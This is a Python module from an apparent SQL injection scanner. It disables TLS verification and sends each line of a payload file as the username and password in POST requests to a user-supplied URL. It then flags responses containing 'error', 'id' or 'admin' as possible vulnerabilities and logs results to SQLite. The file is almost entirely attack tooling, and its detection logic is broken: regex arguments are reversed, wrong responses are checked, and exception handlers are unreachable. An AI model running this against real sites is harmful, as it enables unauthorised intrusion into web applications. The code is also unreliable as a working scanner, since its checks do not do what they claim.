import os
import asyncio
import re
import requests
from colorama import Fore,init
from datetime import datetime
# from database import create_database_for_Captures
import sqlite3
import logging
import sys
parent_dir = os.path.dirname(os.path.abspath(__file__))
sys.path.append(parent_dir)
import sys
import os
import logging

current_directory = os.getcwd()

sys.path.append(current_directory)


attack_type = "authentication bypass SQL injection"
from lib.scripts.headers import Prepare_the_headers
from lib.scripts.headers import headers
from lib.scripts.headers import header
from  lib.regelexpression.patterns import Detect
from lib.priority.Priority import PRIORITY
from lib.priority.Priority import HARMFULL
from logger.logs import logger


####################################################
attack_type = "Time based SQL injection"

#######################################
pattern = r"\berror\b"
htmlpattern = r"\bid\b"
time_based_injection_capture = []
########################################
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
}

##########################################

""" 
              Reference : https://github.com/payloadbox/sql-injection-payload-list 
              for The payloads"""


logging.basicConfig(filename="SQLJ.log",level=logging.DEBUG)



async def Time_based_sql_injection_HEADER(urls):
    """This injection if when the attacker can manipulate the timing of SQL queries and extract the data out of database. """
    try:
        global pattern,htmlpattern
        done = False
        filename = "Time_based_sql.txt"
        current_directory = os.path.dirname(os.path.abspath(__file__))
        file_path = os.path.join(current_directory, filename)

        with open(file_path, "r") as file:
            payload = file.read()
            rows = payload.split("\n")
            sorted_rows = sorted(rows)
            sorted_payload = "\n".join(sorted_rows)
            print(f"[{datetime.now()}]",Fore.RED + str(sorted_payload))
            requests.packages.urllib3.disable_warnings()  
            # url = "https://redtiger.labs.overthewire.org/level1.php"
            req = requests.get(url=urls,verify=False)
            if req.status_code == 200:
                ask = input(f"[{datetime.now()}]"+Fore.GREEN + f"Looks like the host is up with the url:{urls} \n Do you want to send the payload to the website? ")
                logging.info(f"The host target:{urls} is up with status code 200.attack:{attack_type},time:{datetime.now()}")

                if ask.lower() == "y":
                    for line in sorted_payload.split("\n"):
                        #############################################################33
                        params = {
                            "username": line,
                            "password": line
                        }
                        ##############################################################################
                        # print(line)
                        ack = requests.post(url=urls, data=params,verify=False)
                        print(f"[{datetime.now()}]","|Current payload: |", line,"|with status code|:",ack.status_code,"|Attack:|",attack_type,"\n|Headers:|",headers)
                        logging.info(f"Sending the payload:{line} to the target:{urls},attack:{attack_type},time:{datetime.now()}")
                        print(f"[{datetime.now()}]",Fore.GREEN + str(ack.status_code))
                        await asyncio.sleep(5)
                        if "error" in ack.text:
                            print(f"[{datetime.now()}]",Fore.RED + "|Vulnerability found|:", ack.text,"\n|Headers:|",headers)
                            await asyncio.sleep(3)
                            logging.info(f"the error message returned as a response,This might be injectable,attack:{attack_type},target:{urls},time:{datetime.now()}")
                            
                        vuln = re.findall(ack.text,pattern,flags=re.IGNORECASE)
                        htmlVULN = re.findall(ack.text,htmlpattern,flags=re.IGNORECASE)
                        if vuln:
                            print(f"[{datetime.now()}]",Fore.RED + " | Vulnerability found: |", ack.text," | with the count of: |",len(vuln),"|Attack:|",attack_type,"\n|Headers:|",headers)
                            logging.info(f"Error parameter founded in the response,this might be injectable,attack:{attack_type},time:{datetime.now()},target:{urls}")
                            await asyncio.sleep(3)
                        
                        if htmlVULN:
                            print(f"[{datetime.now()}]",Fore.RED + "|Vulnerability found|:", ack.text,"with the count of:",len(htmlVULN),"|Attack:|",attack_type,"\n|Headers:|",headers)
                            logging.info(f"id parameter founded in the response,this might be injectable,attack:{attack_type},time:{datetime.now()},target:{urls}")
                            await asyncio.sleep(3)
                        
                        word = "id" in req.text
                        errword = "error" in req.text
                        if word:
                            print(f"[{datetime.now()}]",Fore.GREEN + "|Vulnerability found|:", ack.text,"with the count of:",htmlVULN,"|Attack:|",attack_type,"\n|Headers:|",headers)
                            logging.info(f"id parameter founded in the response,this might be injectable,attack:{attack_type},time:{datetime.now()},target:{urls}")
                            await asyncio.sleep(3)
                        
                        if errword:
                            print(f"[{datetime.now()}]",Fore.RED + "|Vulnerability found: in the response code of:|", ack.text,"with the count of:",len(htmlVULN),"|Attack:|",attack_type,"\n|Headers:|",headers)
                            logging.info(f"Error parameter founded in the response,this might be injectable,attack:{attack_type},time:{datetime.now()},target:{urls}")
                            await asyncio.sleep(3)
                            
                        
                            
                    if req.status_code == 302:
                        print(f"[{datetime.now()}]","|Could find injectable area on the website,keyword:|",line,"\n|Headers:|",headers)
                        logging.info(f"Could find injectable area on the website,keyword:{line},attack:{attack_type},time:{datetime.now()},target:{urls}")
                        done = True
                        
                    if "Admin" in vuln or "admin" in vuln or "Admin" in ack.text or "admin" in ack.text or "Admin" in htmlVULN or "admin" in htmlVULN:
                        print(f"[{datetime.now()}]",Fore.GREEN+"[INFO]Could connect to the website but did found injectable area on the website.","|Attack:|",attack_type,"\n|Headers:|",headers)
                        logging.info(f"Could connect to the website but did found injectable area on the website,attack:{attack_type},time:{datetime.now()},target:{urls}")
                        
                else:
                    pass
                
            else:
                print(f"[{datetime.now()}]",Fore.RED+"[INFO] Host seems to be down.","|Attack:|",attack_type,"\n|Headers:|",headers)
                logging.error(f"Host:{urls} seems to b down,attack:{attack_type},time:{datetime.now()}")
                
        # time_based_injection_capture.append(str(htmlVULN))
        # time_based_injection_capture.append(str(vuln))
        # await create_database_for_Captures()
        conn = sqlite3.connect("SQLJresult.db")
        cur = conn.cursor()

        sql = "INSERT INTO Datas (Data,attacktype) VALUES (?,?)"
        # values = [attack_type,(ack.text,), (str(headers),), (str(ack.status_code),), (str(vuln,),), (str(htmlVULN),), (str(errword),), (str(word),), (str(req.status_code),), (str(ack.text),)]
        values = [(attack_type, str(ack.text)), (attack_type, str(headers)), (attack_type, str(ack.status_code)), (attack_type, str(vuln)), (attack_type, str(htmlVULN)), (attack_type, str(errword)), (attack_type, str(word)), (attack_type, str(req.status_code)), (attack_type, str(ack.text))]

        cur.executemany(sql, values)

        conn.commit()
        conn.close() 
                    
    except Exception as e:
        print(f"[{datetime.now()}]",e)
        logging.error(f"An error occurred:{e},attack:{attack_type},time:{datetime.now()}")
    
    except ConnectionAbortedError as e:
        print(f"[{datetime.now()}]","[ERROR]ConnectionAbortedError:",e,"|Attack:|",attack_type,"\n|Headers:|",headers)
        logging.error(f"connection aborted,attack:{attack_type},time:{datetime.now()}")
        
    except ConnectionError as e:
        print(f"[{datetime.now()}]","[ERROR]ConnectionError:",e,"|Attack:|",attack_type,"\n|Headers:|",headers)
        logging.error(f"connection error,attack:{attack_type},time:{datetime.now()}")
        
    except ConnectionRefusedError as e:
        print(f"[{datetime.now()}]","[ERROR]ConnectionRefusedError",e,"|Attack:|",attack_type,"\n|Headers:|",headers)
        logging.error(f"connection refused,attack:{attack_type},time:{datetime.now()}")
        
    except  ConnectionResetError as e:
        print(f"[{datetime.now()}]","[ERROR]ConnectionResetError:",e,"|Attack:|",attack_type,"\n|Headers:|",headers)
        logging.error(f"connection reset,attack:{attack_type},time:{datetime.now()}")
        
    except KeyboardInterrupt as e:
        # print(f"[{datetime.now()}]","[ERROR]KeyboardInterrupt:",e)
        pass
    
    except UnicodeEncodeError:
        pass
    
    except Exception as e:
        print(f"[{datetime.now()}]",f"Error: {str(e)}","|Attack:|",attack_type)
        logging.error(f"Error:{str(e)},attack:{attack_type},time:{datetime.now()}")
        
    except MemoryError:
        import psutil
        # Get the system memory information
        memory = psutil.virtual_memory()

        # Calculate the threshold for 80% memory usage
        threshold = memory.total * 0.9

        # Check if the used memory is greater than the threshold
        Err =  memory.used <= threshold
        while not Err:
            memory = psutil.virtual_memory()
            Err = memory.used <= threshold
            print("Please Release you RAM space to continue the application","|Attack:|",attack_type)
            await asyncio.sleep(5)
# asyncio.run(Memory_handling())
    
    finally:
        pass

        
# asyncio.run(Error_based_inj())
# if __name__ != "main":
#     pass      